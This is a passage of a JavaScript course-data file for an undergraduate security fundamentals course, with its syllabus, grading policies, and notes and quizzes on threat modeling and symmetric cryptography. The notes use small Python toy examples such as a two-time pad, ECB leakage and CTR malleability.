CSA.addCourse({
  id: "cs380",
  code: "CS 380",
  title: "Security Fundamentals",
  credits: 4,
  kind: "required",
  term: "y3s",
  summary: "Defensive security for people who build systems: how to think about threats and design against them; the cryptography that every system relies on (symmetric encryption, hashes, MACs, password storage, Diffie–Hellman, RSA signatures, certificates and TLS), taught with toy parameters you can check by hand; why memory-unsafe code is exploitable and what stops it; the web's main flaws (injection, cross-site scripting, request forgery) and their fixes; access control, sandboxing and side channels; and security in practice, from firewalls and fuzzing to incident response, disclosure and the law. C examples were compiled with GCC; every graded problem is a Python simulation or a defensive tool.",
  prereqs: ["CS 210 Computer Systems I", "CS 240 Software Engineering I", "MATH 121 Discrete Mathematics II", "CS 310 Operating Systems", "CS 340 Databases"],
  outcomes: [
    "Write a threat model for a system: its assets, adversaries, attack surface and trust boundaries, with risks ranked and design principles applied",
    "Explain what confidentiality and integrity each require, and choose authenticated encryption with correct nonce handling instead of raw block-cipher modes",
    "Use hash functions, MACs and password-hashing functions correctly, and estimate attack costs with the birthday bound and guessing rates",
    "Explain Diffie–Hellman, RSA signatures, certificates and the TLS handshake, and why textbook RSA and unauthenticated key exchange are unsafe",
    "Explain how stack overflows, integer overflows and use-after-free bugs are exploited, and what each defense (bounds checks, canaries, NX, ASLR, memory-safe languages) does and doesn't stop",
    "Find and fix SQL injection, cross-site scripting and cross-site request forgery, using parameters, output encoding, SameSite cookies, tokens and Content Security Policy",
    "Reason about Unix permissions, access control lists and capabilities, recognize confused deputies, and write constant-time code for secrets",
    "Build security into development (threat modeling, review, fuzzing, dependency management), respond to incidents, and disclose vulnerabilities legally and ethically"
  ],
  rubric: {
    criteriaFor: "problem sets and projects",
    assessments: [
      { name: "Lesson quizzes", weight: 10, desc: "The quiz at the end of each lesson. Your best attempt counts, and your lowest quiz score is dropped." },
      { name: "Problem sets", weight: 25, desc: "Weekly: the lesson's programming problems, plus written exercises such as threat models, attack-cost estimates, permission puzzles and code to review for flaws." },
      { name: "Projects", weight: 30, desc: "Three projects: a threat model and design review of a real open-source application; a secure file-sharing tool using a vetted cryptography library (authenticated encryption, password-based keys, signatures); and a security audit of a deliberately vulnerable course web application, run only in the provided virtual machine, with a written report of findings and fixes." },
      { name: "Midterm exam", weight: 15, desc: "Threat models and cryptography (lessons 1–4)." },
      { name: "Final exam", weight: 20, desc: "Cumulative, with emphasis on systems, web and practice (lessons 5–8)." }
    ],
    criteria: [
      { name: "Correctness", desc: "Does it work, and is it secure against the stated threats?", levels: [
        "Correct on every test, including hostile inputs; no exploitable flaw against the threat model.",
        "Correct in normal use; a minor flaw under hostile input.",
        "Works for honest inputs only, or relies on secrecy of the design.",
        "Doesn't work, or is trivially exploitable." ] },
      { name: "Security reasoning", desc: "Are the threats and defenses argued?", levels: [
        "States assets, adversary and trust boundaries; explains why each defense stops each threat and what remains.",
        "Mostly sound reasoning, with a gap or an unstated assumption.",
        "Lists defenses without saying what they defend against.",
        "No reasoning." ] },
      { name: "Design", desc: "Is it simple, and does it use the right tools?", levels: [
        "Small trusted core, least privilege, safe defaults; vetted libraries rather than home-made cryptography.",
        "Sound, with some needless privilege or complexity.",
        "Works but is hard to review, or reinvents primitives.",
        "No discernible structure." ] },
      { name: "Presentation", desc: "Can a reader follow it?", levels: [
        "Readable code and a clear write-up, with diagrams where they help and findings ranked by risk.",
        "Mostly clear.",
        "Hard to follow.",
        "Unreadable." ] }
    ],
    scale: [["A", "93–100"], ["A−", "90–92"], ["B+", "87–89"], ["B", "83–86"], ["B−", "80–82"], ["C+", "77–79"], ["C", "73–76"], ["C−", "70–72"], ["D", "60–69"], ["F", "below 60"]],
    policies: [
      "<b>Authorization:</b> test only systems you own or have written permission to test. The course's vulnerable application runs in a virtual machine on your own computer; attacking anything else, including the course website and other students' machines, is a violation of this policy and may be a crime (Lesson 8).",
      "<b>Tools:</b> Python on this site for the graded problems; GCC, gdb and a Linux virtual machine for the C examples; and, for the projects, a vetted cryptography library such as Python's <code>cryptography</code> package.",
      "<b>Collaboration:</b> discuss ideas freely; write your own code and reports and name your collaborators.",
      "<b>AI assistants:</b> you may use them to explain concepts and error messages, and must say how. Code and findings you submit must be your own, and you must be able to explain every line.",
      "<b>Late work:</b> four late days for projects, used in whole days; then 10% a day."
    ]
  },
  units: [
    {
      id: "sc1",
      title: "Thinking about security",
      minutes: 90,
      summary: "Assets, threats, vulnerabilities and risk; confidentiality, integrity and availability; threat models and attack surface; trust boundaries in a data-flow diagram; and the design principles (least privilege, defense in depth, fail-safe defaults, complete mediation, economy of mechanism, open design) that real failures keep teaching.",
      notes: `
<p>CS 240 Lesson 8 defined security as a system doing what it should "even when someone is trying to make it do something else", and showed a few common flaws. This course is about building systems that hold up against that someone. Most of it is technique: cryptography, memory safety, web defenses, access control. This first lesson is about the way of thinking that tells you which technique a system needs, and where.</p>

<h3>Assets, threats and risk</h3>
<p>Security starts from what you are protecting. An <strong>asset</strong> is anything of value to someone: a database of grades, a signing key, a user's session, the service being up at exam time. A <strong>threat</strong> is a way the asset could be harmed by someone, called the <strong>adversary</strong> or attacker. A <strong>vulnerability</strong> is a weakness that would let a threat succeed, such as a missing check or an unpatched library; an <strong>attack</strong> (or <strong>exploit</strong>) is an actual attempt to use one. <strong>Risk</strong> combines how likely a harm is with how bad it would be.</p>
<p>Harm comes in three classic kinds, abbreviated <strong>CIA</strong>:</p>
<ul>
<li><strong>Confidentiality</strong>: only authorized parties can read the information. A leaked password file breaks it.</li>
<li><strong>Integrity</strong>: information and systems can't be changed without authorization, or at least changes are detected. A student editing their own grade breaks it.</li>
<li><strong>Availability</strong>: authorized users can use the system when they need it. A flood of requests that takes the site down at exam time breaks it (a <em>denial-of-service</em> attack).</li>
</ul>
<p>Two more properties come up constantly. <strong>Authentication</strong> establishes who someone (or something) is; <strong>authorization</strong> decides what they may do. A login checks the first; "may Ana see grade 1042?" is the second, and CS 240 Lesson 8's broken access control was a failure of it.</p>

<h3>Threat models</h3>
<p>No system is secure against everything: an adversary who can bribe your system administrator or seize your data centre will win. A <strong>threat model</strong> states what you defend against. It answers four questions:</p>
<ol>
<li>What are we building, and what are its assets?</li>
<li>Who might attack it, and what can they do? (A remote stranger on the internet; a logged-in student; a malicious insider; someone who steals a laptop.)</li>
<li>What can go wrong?</li>
<li>What will we do about each threat: prevent it, detect it, limit the damage, or accept it?</li>
</ol>
<p>A threat model makes assumptions explicit, and attacks often succeed exactly where an assumption was false. "Only our own app talks to this API" fails the day someone reads the app's traffic and writes their own client.</p>
<p>To answer question 3 systematically, many teams draw a <strong>data-flow diagram</strong>: the components, the data stores and the flows of data between them. They then mark <strong>trust boundaries</strong>, the lines between parts that trust each other differently: the internet and your web server, your web server and your database, a user's process and the kernel (CS 310 Lesson 1). Every flow across a boundary is a place where input must be checked, and data may need protecting in transit.</p>
<figure class="fig"><svg viewBox="0 0 520 170" width="520" role="img" aria-label="A data-flow diagram: a browser on the internet sends requests to a web server in the DMZ, which queries a database on the internal network. Dashed lines mark the two trust boundaries between the three zones.">
<g class="box"><rect x="20" y="60" width="110" height="44"/><rect x="205" y="60" width="110" height="44"/><rect x="390" y="60" width="110" height="44"/></g>
<g class="ln dash"><line x1="167" y1="20" x2="167" y2="150"/><line x1="352" y1="20" x2="352" y2="150"/></g>
<g class="ln"><line x1="130" y1="82" x2="200" y2="82"/><line x1="315" y1="82" x2="385" y2="82"/><polyline points="194,77 200,82 194,87"/><polyline points="379,77 385,82 379,87"/></g>
<g class="text"><text x="75" y="87" text-anchor="middle">browser</text><text x="260" y="87" text-anchor="middle">web server</text><text x="445" y="87" text-anchor="middle">database</text>
<text x="75" y="35" text-anchor="middle" class="m">internet</text><text x="260" y="35" text-anchor="middle" class="m">DMZ</text><text x="445" y="35" text-anchor="middle" class="m">internal network</text>
<text x="167" y="165" text-anchor="middle" class="m">trust boundary</text><text x="352" y="165" text-anchor="middle" class="m">trust boundary</text>
<text x="173" y="122" class="m">HTTPS</text><text x="358" y="122" class="m">SQL</text></g>
</svg><figcaption>A three-tier web application as a data-flow diagram. Requests from the internet cross one trust boundary to reach the web server (in a "DMZ", a network zone exposed to the internet), and queries cross another to reach the database.</figcaption></figure>
<p>A popular checklist for "what can go wrong" at each element is <strong>STRIDE</strong>, from Microsoft: <em>Spoofing</em> (pretending to be someone else: authentication), <em>Tampering</em> (integrity), <em>Repudiation</em> (denying having done something: logs and signatures), <em>Information disclosure</em> (confidentiality), <em>Denial of service</em> (availability) and <em>Elevation of privilege</em> (authorization). Walking each boundary-crossing flow through the six letters turns a vague worry into a list.</p>

<h3>Attack surface</h3>
<p>The <strong>attack surface</strong> is the sum of the ways an adversary can send input to the system or otherwise touch it: open network ports, URLs, file formats it parses, command-line arguments of a privileged program, the people who answer the support phone. Each is a place for a vulnerability to live, so a smaller surface is easier to defend. Turning off a feature nobody uses, closing a port, and not parsing a format you don't need all reduce risk before you write a single check.</p>

<h3>Ranking risk</h3>
<p>Time for defense is limited, so teams rank threats. A rough method multiplies an estimated probability per year by an estimated cost. The numbers are guesses, but writing them down makes disagreements visible.</p>
<pre><code>threats = [
    ("stolen staff laptop", 0.10, 50_000),
    ("SQL injection in search", 0.30, 400_000),
    ("phishing of an admin", 0.50, 200_000),
    ("data centre flood", 0.01, 1_000_000),
]
for name, p, cost in sorted(threats, key=lambda t: t[1] * t[2], reverse=True):
    print(f"{name:26} {p * cost:>9,.0f}")</code></pre>
<pre data-label="Output"><code>SQL injection in search      120,000
phishing of an admin         100,000
data centre flood             10,000
stolen staff laptop            5,000</code></pre>
<p>The format <code>{p * cost:&gt;9,.0f}</code> right-aligns the expected yearly loss in 9 characters, with thousands separators and no decimals. Expected loss isn't everything: a rare catastrophe (losing every student's records) may deserve defense beyond its expected cost, and some harms, such as exposing a vulnerable person's address, aren't measured in money at all (CS 100 Lesson 3's live-location case).</p>

<h3>Design principles</h3>
<p>In 1975 Jerome Saltzer and Michael Schroeder listed design principles for protection systems that still describe what good designs do. The most important:</p>
<ul>
<li><strong>Least privilege.</strong> Every program and user gets only the access it needs, for only as long as it needs it (CS 240 Lesson 8). A web server that only reads product data should connect to the database with an account that can only read product tables; then an injection flaw in it can't delete users.</li>
<li><strong>Defense in depth.</strong> Use several independent protections, so one failure isn't a breach. If three layers each stop all but 10% of attacks, and they fail independently, an attack gets through all three with probability 0.1<sup>3</sup> = 0.001. Independence is the catch: three layers that share one password, or the same bug, fail together.</li>
<li><strong>Fail-safe defaults.</strong> Base access on permission, not exclusion: the default answer is "no", and access is granted only by an explicit rule. A rule list that forgets a case then denies it, which someone will notice and fix, instead of allowing it, which nobody notices. An access check that crashes must deny (CS 240 Lesson 8's "fail safe").</li>
<li><strong>Complete mediation.</strong> Check every access, every time, at a place the adversary can't bypass. Checking permission when a page is shown but not when its form is submitted, or caching a decision after the permission was revoked, break this. A component that checks every access is called a <strong>reference monitor</strong>; the kernel is the reference monitor for files (CS 310 Lesson 7).</li>
<li><strong>Economy of mechanism.</strong> Keep the security-critical part small and simple, so it can be reviewed and tested completely. The part of a system that must be correct for security to hold is its <strong>trusted computing base</strong> (TCB); the smaller it is, the better.</li>
<li><strong>Open design.</strong> Security mustn't depend on the design being secret; only keys and passwords should be. Attackers read binaries, documentation and stolen source code. This is the cryptographers' <em>Kerckhoffs's principle</em>, from 1883 (Lesson 2).</li>
<li><strong>Separation of privilege</strong> (requiring two conditions, such as two people to approve a large payment) and <strong>psychological acceptability</strong> (security that is too awkward gets bypassed: people write down passwords they can't remember) complete the list.</li>
</ul>

<h3>How real failures happen</h3>
<p>Big breaches rarely need brilliant attacks. They chain ordinary failures, each of which one of these principles would have stopped. In CS 240 Lesson 8's Equifax breach, an unpatched framework let attackers in (attack surface, and patching), an expired certificate blinded monitoring (defense in depth that had quietly lost a layer), and internal systems let them move from database to database (least privilege). In the 1988 Morris worm (CS 210 Lesson 6), a network service that called <code>gets</code> trusted its input across a trust boundary. A pattern to look for in every case study: the system worked as designed for honest users, and the designers had assumed something about the others that wasn't true.</p>
<p class="note">Why it matters: the rest of the course gives you tools. The threat model tells you which tool a system needs, where to put it, and when you are done.</p>
`,
      terms: [
        ["Asset", "Something of value that a system must protect, such as data, keys, accounts or the service itself."],
        ["Threat", "A way an asset could be harmed by an adversary."],
        ["Vulnerability", "A weakness that would let a threat succeed."],
        ["Exploit", "A concrete method or program that uses a vulnerability to cause harm."],
        ["Risk", "The combination of how likely a harm is and how bad it would be."],
        ["Confidentiality, integrity, availability (CIA)", "Only authorized parties can read; no unauthorized changes go undetected; authorized users can use the system when needed."],
        ["Authentication vs authorization", "Establishing who someone is, versus deciding what they may do."],
        ["Threat model", "A statement of what a system defends: its assets, its adversaries and their capabilities, and the threats addressed."],
        ["Trust boundary", "A line in a system between parts that trust each other differently; data crossing it must be checked."],
        ["STRIDE", "A checklist of threat kinds: spoofing, tampering, repudiation, information disclosure, denial of service, elevation of privilege."],
        ["Attack surface", "All the ways an adversary can send input to or interact with a system."],
        ["Defense in depth", "Several independent protections, so that one failure is not a breach."],
        ["Fail-safe defaults", "Denying access unless a rule explicitly allows it."],
        ["Complete mediation", "Checking every access to every object, every time."],
        ["Reference monitor", "A component that checks every access request, cannot be bypassed, and is small enough to verify."],
        ["Trusted computing base (TCB)", "The parts of a system that must work correctly for its security to hold."]
      ],
      quiz: [
        { q: "A student changes their own grade in the course database. Which property is broken?", choices: ["Confidentiality", "Integrity", "Availability", "Authentication"], answer: 1, why: "An unauthorized change to data is a failure of integrity." },
        { q: "What does a threat model state?", choices: ["The list of all possible attacks", "What the system defends, against which adversaries with which capabilities", "The encryption algorithm used", "The cost of the system"], answer: 1, why: "It makes explicit the assets, adversaries and threats addressed, and therefore the assumptions." },
        { q: "Three independent security layers each let 20% of attacks through. What fraction gets through all three?", choices: ["60%", "20%", "0.8%", "8%"], answer: 2, why: "0.2 × 0.2 × 0.2 = 0.008, if the layers really fail independently." },
        { q: "A firewall rule list ends with \"allow everything else\". Which principle does that violate?", choices: ["Economy of mechanism", "Fail-safe defaults", "Open design", "Separation of privilege"], answer: 1, why: "The default should be to deny; access should come from explicit rules." },
        { q: "A web app checks that you may edit a document when it shows the edit form, but not when the edited document is submitted. Which principle is broken?", choices: ["Complete mediation", "Least privilege", "Open design", "Psychological acceptability"], answer: 0, why: "Every access, including the submission, must be checked; an attacker can submit without ever loading the form." },
        { q: "Which change reduces a server's attack surface?", choices: ["Adding a second password check", "Disabling a file-upload feature nobody uses", "Encrypting its logs", "Hiring a security team"], answer: 1, why: "Removing a way for input to reach the system removes the vulnerabilities that might live there." }
      ],
      practice: [
        {
          q: `<p>Sketch a threat model for this course website. A web server sends lesson pages and quizzes to students' browsers over HTTPS; anyone may read them. Each student's quiz scores are kept only in that student's own browser. Each lesson has a help chat: the student types a question, the browser sends it to the server, the server passes the question and the lesson's text to a chatbot (a language model) run by another company, and the reply is shown to the student. Instructors log in with a password and can edit lessons; an edit is saved on the server and seen by every student. List three assets, two kinds of adversary, and for each adversary one threat with the CIA property it targets.</p>`,
          a: `<p>One reasonable answer. Assets: the lesson content (integrity: every student trusts it); students' chat questions and scores (confidentiality: they reveal what a student finds hard); the instructor accounts and their passwords (whoever holds one can change what everyone reads). Adversary 1, a student who wants to change a lesson for everyone: threat, sending the server an edit without logging in as an instructor (integrity, elevation of privilege), countered by checking on the server, for every edit, that it comes from a logged-in instructor. Adversary 2, a stranger on the same Wi-Fi network: threat, reading chat questions as they travel (confidentiality), countered by HTTPS. A third worth naming is the chatbot's company, or anyone who breaks into it: it sees every question and lesson sent to it (confidentiality), so the server should send it no names or other personal details.</p>`
        },
        {
          q: `<p>Use STRIDE on one flow of the figure: the web server's queries to the database across the inner trust boundary. Give one concrete threat per letter, or say why the letter doesn't apply.</p>`,
          a: `<p><em>Spoofing</em>: something else on the internal network connects to the database claiming to be the web server; require authentication of the connection. <em>Tampering</em>: an attacker on the internal network modifies queries in transit; encrypt and authenticate the connection (TLS). <em>Repudiation</em>: an administrator deletes rows and denies it; keep database audit logs out of administrators' reach. <em>Information disclosure</em>: SQL injection in the web server reads other tables (Lesson 6); also traffic sniffing. <em>Denial of service</em>: an expensive query sent repeatedly exhausts the database; limit query rates and timeouts. <em>Elevation of privilege</em>: the web server's database account can do far more than it needs, so any bug in the web server becomes full database control; least privilege.</p>`
        },
        {
          q: `<p>A team says: "Our API is safe because the mobile app is the only client, and it never sends a negative quantity." Which assumption is false, and which principles does the design break? What should the server do?</p>`,
          a: `<p>The false assumption is that only the team's app talks to the API. Anyone can read the app's requests (it runs on the attacker's phone) and send their own, with any quantity. The design trusts input across a trust boundary and violates complete mediation (the check is done in the client, which the attacker controls) and, arguably, open design (it depends on nobody looking at the app). The server must validate every request itself: reject non-positive quantities, check that the user may order for that account, and treat the app's own checks as a convenience for honest users only.</p>`
        },
        {
          q: `<p>Defense in depth with three layers that each stop 90% of attacks gives 0.001 in the notes. Suppose instead that with probability 0.05 a single shared flaw (say, all three layers trust the same stolen administrator password) defeats all of them at once, and otherwise they fail independently as before. What is the probability an attack gets through? What does that say about the calculation in the notes?</p>`,
          a: `<pre><code>p_shared = 0.05
p_through = p_shared + (1 - p_shared) * 0.1 ** 3
print(round(p_through, 5))   # 0.05095</code></pre><p>About 5%, fifty times worse than the independent estimate, and almost all of it from the shared flaw. Multiplying probabilities is only valid for independent failures, and real layers often share people, credentials, code or configuration. Good defense in depth makes layers different in kind: a firewall, an authenticated connection, and a database account with least privilege fail for different reasons.</p>`
        }
      ],
      sources: ["saltzer75", "anderson20", "owasp"]
    },
    {
      id: "sc2",
      title: "Symmetric cryptography",
      minutes: 90,
      summary: "The one-time pad and why reusing its key is fatal; block ciphers as pseudorandom permutations, with AES at the interface level and a toy Feistel cipher; modes of operation (why ECB leaks, CBC, CTR) and nonces; malleability; and authenticated encryption, the only mode real code should use.",
      notes: `
<p>MATH 121 Lesson 5 mentioned that RSA usually encrypts only a short key, and that a fast <strong>symmetric</strong> cipher, where the same secret key encrypts and decrypts, protects the actual data. This lesson is about those ciphers: what they promise, how they are used, and the ways using them goes wrong. The characters are traditional: Alice and Bob share a key <em>k</em> and want to talk; Eve eavesdrops and may also tamper.</p>
<div class="callout"><p>Everything in this course's code is a teaching toy. Real systems must use a vetted library, such as Python's <code>cryptography</code> package, with its recommended defaults. Cryptographic code that passes every functional test can still be completely insecure.</p></div>

<h3>Bytes and XOR</h3>
<p>Ciphers work on bytes. A Python <code>bytes</code> value (the <code>b"..."</code> literals of CS 240 Lesson 2) is a sequence of integers from 0 to 255: indexing gives an integer, <code>bytes([...])</code> builds one from a list, and <code>.hex()</code> writes each byte as two hex digits.</p>
<pre><code>data = b"Hi!"
print(data[0], list(data), data.hex())   # 72 [72, 105, 33] 486921
print(bytes([72, 105]))   # b'Hi'</code></pre>
<p>The workhorse is XOR (⊕, Python's <code>^</code>, CS 210 Lesson 1): 1 where the bits differ. Two facts make it useful: <em>x</em> ⊕ <em>x</em> = 0, and <em>x</em> ⊕ 0 = <em>x</em>. So XORing with the same value twice gives back what you started with: (<em>m</em> ⊕ <em>k</em>) ⊕ <em>k</em> = <em>m</em>.</p>

<h3>The one-time pad</h3>
<p>The <strong>one-time pad</strong> encrypts a message <em>m</em> with a key <em>k</em> of the same length, chosen uniformly at random: <em>c</em> = <em>m</em> ⊕ <em>k</em>, and decryption is <em>m</em> = <em>c</em> ⊕ <em>k</em>.</p>
<pre><code>import secrets

def xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

m = b"HELLO"
k = bytes([0x3a, 0x91, 0x07, 0xc4, 0x5e])
c = xor(m, k)
print(c.hex())   # 72d44b8811
print(xor(c, k))   # b'HELLO'</code></pre>
<p>(In real use <em>k</em> would come from <code>secrets.token_bytes(5)</code>, which draws from the operating system's cryptographically secure random number generator. The <code>random</code> module is <em>not</em> suitable for keys: its outputs can be predicted from earlier ones.)</p>
<p>The one-time pad has <strong>perfect secrecy</strong> (Shannon, 1949): the ciphertext says nothing about the message beyond its length. Here is why. Fix any ciphertext byte <em>c</em> and any candidate message byte <em>m</em>. Exactly one key byte, <em>k</em> = <em>m</em> ⊕ <em>c</em>, maps <em>m</em> to <em>c</em>. Every key byte is equally likely, so every message byte is equally consistent with what Eve saw. "HELLO" and "WORLD" are equally possible decryptions of 72d44b8811, under different keys.</p>
<p>The catch is the key: it must be as long as all the messages together, used only once, and shared in advance. If the same key encrypts two messages, it cancels:</p>
<p class="math"><em>c</em><sub>1</sub> ⊕ <em>c</em><sub>2</sub> = (<em>m</em><sub>1</sub> ⊕ <em>k</em>) ⊕ (<em>m</em><sub>2</sub> ⊕ <em>k</em>) = <em>m</em><sub>1</sub> ⊕ <em>m</em><sub>2</sub></p>
<p>Eve now holds the XOR of two plaintexts, with no key in the way. Natural language is so redundant that a guessed word in one message ("attack", " the ") reveals the matching part of the other:</p>
<pre><code>m1, m2 = b"attack at dawn", b"defend at dusk"
k = secrets.token_bytes(14)
c1, c2 = xor(m1, k), xor(m2, k)
print(xor(c1, c2) == xor(m1, m2))   # True
print(xor(xor(c1, c2), b"attack"))   # b'defend'</code></pre>
<p>Sliding a guessed word along every position and keeping positions where the result looks like text is called <strong>crib dragging</strong>; the programming problem builds it. This is the <em>two-time pad</em>, and the sidebar tells how it broke real Soviet traffic.</p>

<h3>Block ciphers</h3>
<p>Practical ciphers use a short key, typically 128 or 256 bits, for any amount of data. Their basic tool is a <strong>block cipher</strong>: a pair of functions <em>E</em>(<em>k</em>, <em>x</em>) and <em>D</em>(<em>k</em>, <em>y</em>) on fixed-size blocks, with <em>D</em>(<em>k</em>, <em>E</em>(<em>k</em>, <em>x</em>)) = <em>x</em>. For each key, <em>E</em>(<em>k</em>, ·) is a permutation of all possible blocks. The security goal is that it be a <strong>pseudorandom permutation</strong> (PRP): to anyone without the key, it is indistinguishable from a permutation chosen uniformly at random, even after seeing the encryptions of blocks of their choice. A weaker notion is a <strong>pseudorandom function</strong> (PRF): a keyed function <em>F</em>(<em>k</em>, <em>x</em>), not necessarily invertible and possibly with outputs of a different length from its inputs, that to anyone without the key is indistinguishable from a function chosen uniformly at random. A PRP is a PRF that also happens to be a permutation. Some uses need only the PRF property: CTR mode below computes only <em>E</em>, never <em>D</em>.</p>
<p>The standard block cipher is <strong>AES</strong> (the Advanced Encryption Standard, 2001), with 128-bit (16-byte) blocks and keys of 128, 192 or 256 bits. Inside, it applies 10 to 14 rounds of byte substitution, shuffling and mixing with round keys derived from the key; we will use it only through its interface. Its design is public, chosen in an open competition in which anyone could try to break the candidates. That follows <em>Kerckhoffs's principle</em> (Auguste Kerckhoffs, 1883), Lesson 1's open design for cryptography: a cipher must stay secure even if the enemy knows everything about it except the key. Modern processors have AES instructions, so it runs at gigabytes per second. No attack on AES is known that is much better than trying every key, and trying 2<sup>128</sup> ≈ 3.4 × 10<sup>38</sup> keys is far beyond any computer.</p>
<p>How can a cipher be invertible when its inner mixing function isn't? The older standard, DES (1977), used a <strong>Feistel network</strong>, and a small one shows the trick. Split the block into halves <em>L</em>, <em>R</em>. Each round replaces (<em>L</em>, <em>R</em>) with (<em>R</em>, <em>L</em> ⊕ <em>F</em>(<em>R</em>)), where <em>F</em> is any function of the key, the round number and <em>R</em>. Given the output (<em>R</em>, <em>L</em> ⊕ <em>F</em>(<em>R</em>)), you know <em>R</em>, so you can compute <em>F</em>(<em>R</em>) and XOR it away, whatever <em>F</em> is:</p>
<pre><code>import hashlib

def F(key, i, half):
    return hashlib.sha256(key + bytes([i]) + half).digest()[:8]

def encrypt_block(key, block):          # a toy 16-byte block cipher: 4 Feistel rounds
    L, R = block[:8], block[8:]
    for i in range(4):
        L, R = R, xor(L, F(key, i, R))
    return L + R

def decrypt_block(key, block):          # the same rounds, undone in reverse order
    L, R = block[:8], block[8:]
    for i in reversed(range(4)):
        L, R = xor(R, F(key, i, L)), L
    return L + R

key = b"sixteen byte key"
b = encrypt_block(key, b"YELLOW SUBMARINE")
print(decrypt_block(key, b))   # b'YELLOW SUBMARINE'</code></pre>
<p>(SHA-256, a hash function from Lesson 3, here just mixes bytes; <code>.digest()[:8]</code> keeps 8 of its 32 output bytes.) This toy is not secure; it is here so you can see a permutation built from a non-invertible function.</p>

<h3>Modes of operation</h3>
<p>A block cipher encrypts 16 bytes. A <strong>mode of operation</strong> says how to encrypt a longer message with it.</p>
<p><strong>ECB</strong> (electronic codebook), the obvious mode, encrypts each block separately. It leaks: equal plaintext blocks give equal ciphertext blocks, so Eve sees the message's structure.</p>
<pre><code>def ecb_encrypt(key, pt):
    return b"".join(encrypt_block(key, pt[i:i + 16]) for i in range(0, len(pt), 16))

pt = b"pay ana $100.00 " + b"pay bob $100.00 " + b"pay ana $100.00 "
ct = ecb_encrypt(key, pt)
print([ct[i:i + 16].hex()[:8] for i in range(0, len(ct), 16)])   # ['93a2ca90', '16abf3b8', '93a2ca90']</code></pre>
<p>Eve learns that payments 1 and 3 are the same, without the key. An image encrypted with ECB famously still shows its outline, because large areas of one colour repeat. The deeper lesson: any <strong>deterministic</strong> encryption, which always maps the same message to the same ciphertext, leaks equality. A secure scheme must be randomized, or must take a value that never repeats.</p>
<p><strong>CBC</strong> (cipher block chaining) XORs each plaintext block with the previous ciphertext block before encrypting it, starting from a random <strong>initialization vector</strong> (IV) sent with the ciphertext: <em>C</em><sub><em>i</em></sub> = <em>E</em>(<em>k</em>, <em>P</em><sub><em>i</em></sub> ⊕ <em>C</em><sub><em>i</em>−1</sub>), with <em>C</em><sub>0</sub> = IV. Equal blocks now encrypt differently. CBC needs the message padded to a whole number of blocks, and padding has caused real attacks (a server that reveals whether a decrypted message had valid padding lets an attacker decrypt it byte by byte, the <em>padding oracle</em> attack).</p>
<p><strong>CTR</strong> (counter mode) turns the block cipher into a stream cipher. It encrypts a <strong>nonce</strong> (a "number used once") together with a counter, 0, 1, 2, …, to make a keystream, and XORs the keystream with the message, like a one-time pad whose pad is generated from the key:</p>
<figure class="fig"><svg viewBox="0 0 480 190" width="480" role="img" aria-label="Counter mode: three boxes E sub k encrypt nonce with counter 0, 1 and 2. Each output is XORed with a plaintext block P0, P1, P2 to give ciphertext blocks C0, C1, C2.">
<g class="box"><rect x="40" y="55" width="100" height="36"/><rect x="190" y="55" width="100" height="36"/><rect x="340" y="55" width="100" height="36"/></g>
<g class="ln"><line x1="90" y1="32" x2="90" y2="55"/><line x1="240" y1="32" x2="240" y2="55"/><line x1="390" y1="32" x2="390" y2="55"/>
<line x1="90" y1="91" x2="90" y2="122"/><line x1="240" y1="91" x2="240" y2="122"/><line x1="390" y1="91" x2="390" y2="122"/>
<circle cx="90" cy="132" r="10"/><circle cx="240" cy="132" r="10"/><circle cx="390" cy="132" r="10"/>
<line x1="80" y1="132" x2="100" y2="132"/><line x1="90" y1="122" x2="90" y2="142"/><line x1="230" y1="132" x2="250" y2="132"/><line x1="240" y1="122" x2="240" y2="142"/><line x1="380" y1="132" x2="400" y2="132"/><line x1="390" y1="122" x2="390" y2="142"/>
<line x1="45" y1="132" x2="80" y2="132"/><line x1="195" y1="132" x2="230" y2="132"/><line x1="345" y1="132" x2="380" y2="132"/>
<line x1="90" y1="142" x2="90" y2="165"/><line x1="240" y1="142" x2="240" y2="165"/><line x1="390" y1="142" x2="390" y2="165"/></g>
<g class="text"><text x="90" y="78" text-anchor="middle">E(k, ·)</text><text x="240" y="78" text-anchor="middle">E(k, ·)</text><text x="390" y="78" text-anchor="middle">E(k, ·)</text>
<text x="90" y="25" text-anchor="middle" class="m">nonce ‖ 0</text><text x="240" y="25" text-anchor="middle" class="m">nonce ‖ 1</text><text x="390" y="25" text-anchor="middle" class="m">nonce ‖ 2</text>
<text x="30" y="137" text-anchor="middle">P₀</text><text x="180" y="137" text-anchor="middle">P₁</text><text x="330" y="137" text-anchor="middle">P₂</text>
<text x="90" y="182" text-anchor="middle">C₀</text><text x="240" y="182" text-anchor="middle">C₁</text><text x="390" y="182" text-anchor="middle">C₂</text></g>
</svg><figcaption>CTR mode. The block cipher encrypts the nonce joined with a block counter; the results form a keystream that is XORed with the plaintext. Decryption computes the same keystream and XORs again.</figcaption></figure>
<pre><code>def ctr(key, nonce, data):              # nonce: 8 bytes; counter: 8 bytes
    out = b""
    for i in range(0, len(data), 16):
        pad = encrypt_block(key, nonce + (i // 16).to_bytes(8, "big"))
        out += xor(data[i:i + 16], pad)
    return out

nonce = bytes(8)
c = ctr(key, nonce, pt)
print(ctr(key, nonce, c) == pt)   # True</code></pre>
<p>CTR needs no padding, its blocks can be computed in parallel, and decryption uses only <em>E</em>. Its rule is absolute: <strong>never reuse a nonce with the same key</strong>. The same nonce gives the same keystream, and that is the two-time pad again. Nonces can be counters (the sender keeps state) or random values long enough that repeats are negligible (Lesson 3's birthday bound says how long).</p>

<h3>Encryption isn't integrity</h3>
<p>Confidentiality doesn't stop tampering. In CTR mode, flipping a ciphertext bit flips the same plaintext bit, so Eve can change a message she can't read, if she can guess part of it. Ciphers with this property are <strong>malleable</strong>:</p>
<pre><code>c = ctr(key, nonce, b"pay ana $100")
forged = xor(c, xor(b"pay ana $100", b"pay eve $900"))
print(ctr(key, nonce, forged))   # b'pay eve $900'</code></pre>
<p>Eve XORed the ciphertext with (old text ⊕ new text); decryption XORs in the keystream, and the old text cancels. Bob decrypts a perfectly valid-looking message.</p>
